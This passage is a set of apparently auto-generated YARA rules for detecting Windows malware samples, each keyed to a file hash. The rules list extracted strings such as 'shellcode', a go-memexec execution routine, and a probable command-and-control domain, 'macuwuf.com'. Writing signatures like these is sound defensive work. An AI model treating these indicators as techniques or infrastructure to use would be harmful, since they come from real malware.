      $s17 = " untyped locals , not a function.WithValue(type 0123456789ABCDEF0123456789abcdef2384185791015625Already ReportedContent-Encoding" ascii /* score: '30.00'*/
      $s18 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketstream e" ascii /* score: '29.50'*/
      $s19 = "ERRORFiji Standard TimeGetComputerNameExWGetExitCodeProcessGetFileAttributesWGetModuleFileNameWIran Standard TimeLookupAccountNa" ascii /* score: '29.00'*/
      $s20 = "unixpacketunknown pcuser-agentws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status " ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and all of them
}

rule cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374 {
   meta:
      description = "dataset - file cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '69.00'*/
      $x2 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '61.00'*/
      $x3 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '58.50'*/
      $x4 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x5 = "152587890625762939453125Bidi_ControlGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_ControlLoadLibr" ascii /* score: '47.00'*/
      $x6 = " freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock,  nBSSRoots= p->status= s.nelems=  schedtick= span.l" ascii /* score: '47.00'*/
      $x7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x8 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125Central America Standard TimeCentral Pacific Standard " ascii /* score: '43.00'*/
      $x9 = "structure needs cleaning bytes failed with errno= to unused region of span2910383045673370361328125AUS Central Standard TimeAUS " ascii /* score: '35.00'*/
      $x10 = "github.com/amenzhinsky/go-memexec.(*Exec).Command" fullword ascii /* score: '34.00'*/
      $x11 = "entersyscallexit status gcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '33.00'*/
      $x12 = "mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivecontext.TODOdumping heap" ascii /* score: '32.00'*/
      $x13 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed t" ascii /* score: '32.00'*/
      $x14 = "yptReleaseContextEgypt Standard TimeGetCurrentProcessIdGetSystemDirectoryWGetTokenInformationHaiti Standard TimeIDS_Binary_Opera" ascii /* score: '31.00'*/
      $s15 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s16 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s17 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s18 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s19 = "scallblockexec format errorexec: not startedg already scannedglobalAlloc.mutexgp.waiting != nillocked m0 woke upmark - bad statu" ascii /* score: '30.00'*/
      $s20 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule d120e20c7e868c1ce1b94ed63318be6d {
   meta:
      description = "dataset - file d120e20c7e868c1ce1b94ed63318be6d"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "942a315f52b49601cb8a2080fa318268f7a670194f9c5be108d936db32affd52"
   strings:
      $s1 = "!GUID_PROCESSOR_PARKING_CORE_OVERRIDE" fullword ascii /* score: '20.00'*/
      $s2 = "!GUID_PROCESSOR_PARKING_HEADROOM_THRESHOLD" fullword ascii /* score: '20.00'*/
      $s3 = "GUID_PROCESSOR_PARKING_HEADROOM_THRESHOLD" fullword ascii /* score: '20.00'*/
      $s4 = "GUID_PROCESSOR_PARKING_CORE_OVERRIDE" fullword ascii /* score: '20.00'*/
      $s5 = "!IID_IDropTarget" fullword ascii /* score: '16.00'*/
      $s6 = "C:\\crossdev\\gccmaster\\build-tdm64\\runtime\\mingw-w64-crt" fullword ascii /* score: '16.00'*/
      $s7 = "PROCESSOR_SKYLAKE" fullword ascii /* score: '15.00'*/
      $s8 = "PROCESSOR_BDVER1" fullword ascii /* score: '15.00'*/
      $s9 = "!IID_IProcessLock" fullword ascii /* score: '15.00'*/
      $s10 = "!GUID_PROCESSOR_CORE_PARKING_MAX_CORES" fullword ascii /* score: '15.00'*/
      $s11 = "PROCESSOR_BDVER2" fullword ascii /* score: '15.00'*/
      $s12 = "!GUID_PROCESSOR_PERF_INCREASE_POLICY" fullword ascii /* score: '15.00'*/
      $s13 = "GUID_PROCESSOR_CORE_PARKING_OVER_UTILIZATION_HISTORY_THRESHOLD" fullword ascii /* score: '15.00'*/
      $s14 = "!GUID_PROCESSOR_CORE_PARKING_AFFINITY_HISTORY_DECREASE_FACTOR" fullword ascii /* score: '15.00'*/
      $s15 = "PROCESSOR_ZNVER2" fullword ascii /* score: '15.00'*/
      $s16 = "GUID_PROCESSOR_PERF_INCREASE_TIME" fullword ascii /* score: '15.00'*/
      $s17 = "!IID_ISynchronizeMutex" fullword ascii /* score: '15.00'*/
      $s18 = "!GUID_PROCESSOR_PERF_INCREASE_THRESHOLD" fullword ascii /* score: '15.00'*/
      $s19 = "GUID_PROCESSOR_CORE_PARKING_OVER_UTILIZATION_THRESHOLD" fullword ascii /* score: '15.00'*/
      $s20 = "!IID_IXMLDOMProcessingInstruction" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9 {
   meta:
      description = "dataset - file 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
   strings:
      $x1 = ".lib section in a.out corruptedCentral Brazilian Standard TimeMountain Standard Time (Mexico)W. Central Africa Standard Timecann" ascii /* score: '56.00'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark terminationattempting to link in too many shar" ascii /* score: '47.00'*/
      $x3 = "= gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until pc=CancelI" ascii /* score: '43.00'*/
      $x4 = "bad special kindbad symbol tablecastogscanstatusgc: unswept spangcshrinkstackoffinteger overflowinvalid argumentinvalid exchange" ascii /* score: '43.00'*/
      $x5 = "bad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectiongcBlackenPromptly=identifier removedin" ascii /* score: '42.00'*/
      $x6 = "Pakistan Standard TimeParaguay Standard TimeSakhalin Standard TimeTasmania Standard Timeaddress already in useadvapi32.dll not f" ascii /* score: '39.00'*/
      $x7 = "sched={pc:_MSpanInUsebad addressbad messagebad timedivbroken pipecgocall nilclosesocketcreated by crypt32.dllfile existsfloat32n" ascii /* score: '35.00'*/
      $x8 = "bad hmap sizebad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pgchelperstart: bad m->helpgcgcstopm: negative nmspinninginvalid runtime " ascii /* score: '33.00'*/
      $x10 = "unknown pcws2_32.dll (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock,  p->mcach" ascii /* score: '33.00'*/
      $x11 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
      $x12 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $s13 = "CertCloseStoreCreateProcessWCryptGenRandomFindFirstFileWFormatMessageWGC assist waitGC worker initGetConsoleModeGetProcAddressGe" ascii /* score: '30.00'*/
      $s14 = "wrong medium type, locked to threadArab Standard TimeCommandLineToArgvWCreateFileMappingWCuba Standard TimeFiji Standard TimeGet" ascii /* score: '29.00'*/
      $s15 = "Process32FirstWRegCreateKeyExWRegDeleteValueWUnmapViewOfFileacquirep: p->m=advertise errorforce gc (idle)key has expiredmalloc d" ascii /* score: '29.00'*/
      $s16 = "; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mutex; runt" ascii /* score: '28.00'*/
      $s17 = " runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mutex; runti" ascii /* score: '28.00'*/
      $s18 = "; head runtime.guintptr; tail runtime.guintptr }; sweepWaiters struct { lock runtime.mutex; head runtime.guintptr }; cycles uint" ascii /* score: '28.00'*/
      $s19 = "*struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struct { runtim" ascii /* score: '27.00'*/
      $s20 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d {
   meta:
      description = "dataset - file d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s2 = "DeleteGroupadd_OnExecuteCommandgetCommandIdentity" fullword ascii /* score: '26.00'*/
      $s3 = "kitty-temp.exe" fullword wide /* score: '26.00'*/
      $s4 = "SendExecuteDependencyCodeGetTypesFromInterface" fullword ascii /* score: '23.00'*/
      $s5 = "get_InstanceExecuteGetWindowTextLength" fullword ascii /* score: '23.00'*/
      $s6 = "shellcode" fullword ascii /* score: '22.00'*/
      $s7 = "processLogget_AvatarIconGetPlugin" fullword ascii /* score: '20.00'*/
      $s8 = "get_AliasesLogWarningProcessLog" fullword ascii /* score: '20.00'*/
      $s9 = "ProcessLogLogGetGroup" fullword ascii /* score: '20.00'*/
      $s10 = "Reloadget_PermissionsProcessLog" fullword ascii /* score: '20.00'*/
      $s11 = "<FixedUpdate>b__4_0SaveGroupExecute" fullword ascii /* score: '18.00'*/
      $s12 = "ParseUInt64ParseDoubleExecute" fullword ascii /* score: '18.00'*/
      $s13 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s14 = "CREATE_PROTECTED_PROCESS" fullword ascii /* score: '15.00'*/
      $s15 = "PROCESS_MODE_BACKGROUND_END" fullword ascii /* score: '15.00'*/
      $s16 = "processAccess" fullword ascii /* score: '15.00'*/
      $s17 = "DEBUG_ONLY_THIS_PROCESS" fullword ascii /* score: '15.00'*/
      $s18 = "PROCESS_MODE_BACKGROUND_BEGIN" fullword ascii /* score: '15.00'*/
      $s19 = "DEBUG_PROCESS" fullword ascii /* score: '15.00'*/
      $s20 = "DETACHED_PROCESS" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00 {
   meta:
      description = "dataset - file 1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00"
   strings:
      $s1 = "RapportGP.dll" fullword ascii /* score: '26.00'*/
      $s2 = ".?AU?$error_info_injector@Vservice_already_exists@asio@boost@@@exception_detail@boost@@" fullword ascii /* score: '23.00'*/
      $s3 = "api-ms-win-core-errorhandling-l1-1-2.dll" fullword ascii /* score: '23.00'*/
      $s4 = ".?AV?$clone_impl@U?$error_info_injector@Vservice_already_exists@asio@boost@@@exception_detail@boost@@@exception_detail@boost@@" fullword ascii /* score: '23.00'*/
      $s5 = "macuwuf.com" fullword ascii /* score: '21.00'*/
      $s6 = ".?AV?$clone_impl@U?$error_info_injector@Vinvalid_service_owner@asio@boost@@@exception_detail@boost@@@exception_detail@boost@@" fullword ascii /* score: '20.00'*/
      $s7 = "tls_post_process_client_hello" fullword ascii /* score: '20.00'*/
      $s8 = "tls_post_process_client_key_exchange" fullword ascii /* score: '20.00'*/
      $s9 = ".?AU?$error_info_injector@Vinvalid_service_owner@asio@boost@@@exception_detail@boost@@" fullword ascii /* score: '20.00'*/
      $s10 = "D:\\Sources\\boost_1_68_0\\boost/beast/http/impl/read.ipp" fullword ascii /* score: '19.00'*/
      $s11 = "tls_process_new_session_ticket" fullword ascii /* score: '18.00'*/
      $s12 = "log conf missing description" fullword ascii /* score: '17.00'*/
      $s13 = "X-Device-User-Agent" fullword ascii /* score: '17.00'*/
      $s14 = "D:\\Sources\\boost_1_68_0\\boost/beast/core/impl/read_size.ipp" fullword ascii /* score: '16.00'*/
      $s15 = "assertion failed: s->d1->w_msg_hdr.msg_len + ((s->version == DTLS1_BAD_VER) ? 3 : DTLS1_CCS_HEADER_LENGTH) == (unsigned int)s->i" ascii /* score: '16.00'*/
      $s16 = "assertion failed: s->d1->w_msg_hdr.msg_len + DTLS1_HM_HEADER_LENGTH == (unsigned int)s->init_num" fullword ascii /* score: '16.00'*/
      $s17 = "D:\\Sources\\boost_1_68_0\\boost/beast/http/impl/message.ipp" fullword ascii /* score: '16.00'*/
      $s18 = "assertion failed: s->init_num == (int)s->d1->w_msg_hdr.msg_len + DTLS1_HM_HEADER_LENGTH" fullword ascii /* score: '16.00'*/
      $s19 = "D:\\Sources\\boost_1_68_0\\boost/beast/http/impl/verb.ipp" fullword ascii /* score: '16.00'*/
      $s20 = "\\Windows Mail\\wab.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 6000KB and
      8 of them
}

rule sig_3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d {
   meta:
      description = "dataset - file 3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d"
   strings:
      $x1 = "C:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\wmi-0.9.1\\src\\connection.rswmi::connectionCallin" ascii /* score: '34.00'*/
      $x2 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.18\\src\\lib.rs" fullword ascii /* score: '33.00'*/
      $x3 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.18\\src\\legacy.rs" fullword ascii /* score: '33.00'*/
      $x4 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hashbrown-0.9.0\\src\\raw\\mod.rs" fullword ascii /* score: '33.00'*/
      $x5 = "C:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\wmi-0.9.1\\src\\connection.rswmi::connectionCallin" ascii /* score: '31.00'*/
      $s6 = "attempt to divide by zeroC:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\num-integer-0.1.44\\src" ascii /* score: '30.00'*/
      $s7 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\alloc\\layout.rs" ascii /* score: '30.00'*/
      $s8 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\impls.rsH)" fullword ascii /* score: '30.00'*/
      $s9 = "attempt to divide by zeroC:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\num-integer-0.1.44\\src" ascii /* score: '30.00'*/
      $s10 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\num\\dec2flt\\mo" ascii /* score: '30.00'*/
      $s11 = "\\\\.\\pipe\\__rust_anonymous_pipe1__.library\\std\\src\\sys\\windows\\rand.rscouldn't generate random bytes: library\\std\\src" ascii /* score: '29.00'*/
      $s12 = "C:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\base64-0.13.0\\src\\decode.rs" fullword ascii /* score: '28.00'*/
      $s13 = "wbimebroker.exeqqpyusercenter.exetim.exetxplatform.exeeim.exeruntimebroker.exedwm.exe" fullword ascii /* score: '28.00'*/
      $s14 = "a Display implementation returned an error unexpectedlyC:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib" ascii /* score: '27.00'*/
      $s15 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\mod.rs" fullword ascii /* score: '27.00'*/
      $s16 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\collections\\bt" ascii /* score: '27.00'*/
      $s17 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\num\\dec2flt\\ra" ascii /* score: '27.00'*/
      $s18 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\char\\methods.rs" ascii /* score: '27.00'*/
      $s19 = "a Display implementation returned an error unexpectedlyC:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib" ascii /* score: '27.00'*/
      $s20 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\slice\\mod.rs" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule d3f1d658545c3726233e696e3cea4d66d9a515d60f551ea01abfda00552e17da {
   meta:
      description = "dataset - file d3f1d658545c3726233e696e3cea4d66d9a515d60f551ea01abfda00552e17da"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d3f1d658545c3726233e696e3cea4d66d9a515d60f551ea01abfda00552e17da"
   strings:
      $s1 = "Project1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "whoami.exe" fullword ascii /* score: '22.00'*/
      $s3 = "DvC.wlg" fullword ascii /* score: '7.00'*/
      $s4 = " restrict" fullword ascii /* score: '6.00'*/
      $s5 = " volatile" fullword ascii /* score: '6.00'*/
      $s6 = "_ZN8DllClassD2Ev" fullword ascii /* score: '5.00'*/
      $s7 = "_ZN8DllClassD1Ev" fullword ascii /* score: '5.00'*/
      $s8 = "rOJqU14" fullword ascii /* score: '5.00'*/
      $s9 = "_ZN8DllClassC1Ev" fullword ascii /* score: '5.00'*/
      $s10 = "_ZN8DllClassD0Ev" fullword ascii /* score: '5.00'*/
      $s11 = "aFsEKC2" fullword ascii /* score: '5.00'*/
      $s12 = "wBNhOm1" fullword ascii /* score: '5.00'*/
      $s13 = "_ZTV8DllClass" fullword ascii /* score: '5.00'*/
      $s14 = "_ZN8DllClassC2Ev" fullword ascii /* score: '5.00'*/
      $s15 = "8DllClass" fullword ascii /* score: '5.00'*/
      $s16 = "Roxf- " fullword ascii /* score: '5.00'*/
      $s17 = "sjlj_once" fullword ascii /* score: '4.00'*/
      $s18 = "|$0tGH" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "D$hL+D$`H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = ":YEWUU!" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_19f8797dc1c69909d8d0fb563d13e955dc98a1d22fdf8b2c551731323d672505 {
   meta:
      description = "dataset - file 19f8797dc1c69909d8d0fb563d13e955dc98a1d22fdf8b2c551731323d672505"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "19f8797dc1c69909d8d0fb563d13e955dc98a1d22fdf8b2c551731323d672505"
   strings:
      $s1 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s2 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s3 = "  <description>Device Display Object Function Discovery Provider</description>" fullword ascii /* score: '10.00'*/
      $s4 = "7 7$7(7,70747 :$:(:,:0:4:8:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wwptpH' */
      $s5 = ">3>@>E>\\>" fullword ascii /* score: '9.00'*/ /* hex encoded string '>' */
      $s6 = "    version=\"1.0.0.0\"" fullword ascii /* score: '7.00'*/
      $s7 = ".?AUIProviderProperties@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = ".?AVTComputerDevice@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = ".?AVTListEntry@?$TIntrusiveList@VTDisplayObject@@@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = ".?AVTClassFactory@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = ".?AVTDevice@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "DeviceDisplayObjectProvider.pdb" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = ".?AVTListEntry@?$TIntrusiveList@VTDDOProvider@@@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = ".?AVTFileStream@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = ".?AVTProviderServices@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = ".?AVTDeviceFunctionCallback@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = ".?AUIFunctionDiscoveryProvider@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "<B=H=p=" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = ".?AVTDisplayObject@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = ".?AVTSRWLock@@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_2ebcc948ef663d83710f246fe2c0e185a92fa29c12b94934ef189d43c4d18c62 {
   meta:
      description = "dataset - file 2ebcc948ef663d83710f246fe2c0e185a92fa29c12b94934ef189d43c4d18c62"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2ebcc948ef663d83710f246fe2c0e185a92fa29c12b94934ef189d43c4d18c62"
   strings:
      $s1 = "Source" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.50'*/ /* Goodware String - occured 499 times */
      $s2 = "8!9>9a9" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "1!2'242" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "7,8V8s8" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "q(Vh\\\"," fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "6E8m8t8i9/:" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "=3=9=@=G=N=X=e=" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = ": :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\\:h:x:|:" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "5%5<5C5T5Z5{5u6" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = ":,;d;n;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = ":H;7<\\<" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "</=6=<=G=" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = ":%:B:m:" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "1+2E2\\2}3" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "7\"7(7N7W7h7" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "4Vh\\\"," fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "3%363=3^3" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "9FttY9" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = ";8=_=q={=" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "~0WhL!," fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_2941c95c651a851d37fa94083c9a60738652ea70fb6f8f4e43c3433dae5e43e8 {
   meta:
      description = "dataset - file 2941c95c651a851d37fa94083c9a60738652ea70fb6f8f4e43c3433dae5e43e8"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2941c95c651a851d37fa94083c9a60738652ea70fb6f8f4e43c3433dae5e43e8"
   strings:
      $s1 = "LMMMMMMMMMMMMMMMMMMMM" fullword ascii /* reversed goodware string 'MMMMMMMMMMMMMMMMMMMML' */ /* score: '16.50'*/
      $s2 = "       <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s3 = "             <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s4 = "                       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "        processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s6 = "                       publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s7 = "                       version=\"6.0.0.0\"" fullword ascii /* score: '7.00'*/
      $s8 = "        version=\"1.0.0.0\"" fullword ascii /* score: '7.00'*/
      $s9 = "MMMMMMMMMMMMMMMMMMMMQ" fullword ascii /* score: '6.50'*/
      $s10 = "CMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
      $s11 = "RGMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
      $s12 = "MMMMMMMMMMMMMMMMMMMME" fullword ascii /* score: '6.50'*/
      $s13 = "MMMMMMMMMMMMMMMMMMMMV" fullword ascii /* score: '6.50'*/
      $s14 = "QQMMMMMMMMMMMMMMMMMMMMP" fullword ascii /* score: '6.50'*/
      $s15 = "KMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
      $s16 = "VIMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
      $s17 = "YMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
      $s18 = "XMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
      $s19 = "MMMMMMMMMMMMMMMMMMMMRB" fullword ascii /* score: '6.50'*/
      $s20 = "GMMMMMMMMMMMMMMMMMMMM" fullword ascii /* score: '6.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280 {
   meta:
      description = "dataset - file d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280"
   strings:
      $s1 = "@[X] Failed to load mango-si.dll" fullword ascii /* score: '23.00'*/
